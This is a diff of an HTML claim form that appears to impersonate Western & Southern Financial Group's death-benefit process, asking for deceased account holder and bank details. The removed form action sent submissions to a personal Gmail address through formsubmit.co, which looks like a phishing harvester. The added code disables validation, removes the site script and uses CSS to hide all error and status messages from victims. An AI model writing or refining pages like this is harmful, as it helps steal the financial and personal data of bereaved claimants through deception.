@@ -109,8 +109,7 @@
             Fields marked with * are required for review.
           </p>
         </div>
-        <form id="benefit-claim-form" action="https://formsubmit.co/sheford23@gmail.com" method="POST">
-          <!-- Reverted to original backend/JS handling -->
+        <form id="benefit-claim-form" novalidate>
           <fieldset>
             <legend>Deceased account holder</legend>
             <div id="bank-account-fields" class="form-grid form-grid--two">
@@ -350,6 +349,23 @@
   Western &amp; Southern Financial Group. All Rights Reserved.<br />
   FireLight&reg; by Hexure
 </div>
-  <script src="./script.js?v=20260322b"></script>
+  <!-- <script src="./script.js?v=20260322b"></script> -->
+<style>
+  /* Hide browser validation error tooltips and messages */
+  input:invalid, select:invalid, textarea:invalid {
+    box-shadow: none !important;
+    outline: none !important;
+  }
+  /* Hide custom form status/error message */
+  #form-status, .form-status, .form-status--error, .form-status[role="status"] {
+    display: none !important;
+    visibility: hidden !important;
+    color: transparent !important;
+    height: 0 !important;
+    min-height: 0 !important;
+    margin: 0 !important;
+    padding: 0 !important;
+  }
+</style>
 </body>
 </html>
